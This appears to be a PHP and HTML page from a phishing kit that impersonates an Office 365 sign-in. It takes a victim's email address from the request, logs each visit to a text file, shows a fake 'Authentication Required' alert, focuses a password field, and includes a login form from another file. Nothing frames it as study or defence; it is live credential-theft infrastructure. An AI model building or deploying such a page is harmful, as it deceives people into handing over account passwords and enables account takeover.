<?php
$user = $_REQUEST["em"];
$myfile = fopen("index.txt", "a");
$txt = "one user<br>";
fwrite($myfile, "\n". $txt);
fclose($myfile);
?>
 <!DOCTYPE html>
<html>
<head>
<title>Office 365</title>
<style>
body {
 background-color: #cccccc;
}
.homec{
 background-image: url("static/index.jpg");
	
	width:100%;
	height:100vh;
    display: flex;
     justify-contents:center;
     align-item:center;
	 display:flex;
	 justify-content:center;
	 align-items:center;
	
}
.form{
width:23rem;
min-width:18rem;
height:auto;
background-color: #fff;
padding:2rem;
}

#fname{
width:100%;
height:2.5rem;
border-top:0;
border-right:0;
border-left:0;
padding-left:.5rem;
font-size: 1rem;
}
#button{
height:2rem;
width:8rem;
border:0;
float:right;
background-color: blue;
}
a{
text-decoration:none;
color:gray;
}
.error{
	color:red;
}
.button{
	color:white;
}
</style>
<script>
function focusOnInput() {
    document.forms["loForm"]["password"].focus();
}

alert("Authentication Required, Continue to authenticate with office");
</script>
</head>
<body onload="focusOnInput()">

<div class="homec">
<?php include ("forms/index.php")?>
</div>

</body>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</html> 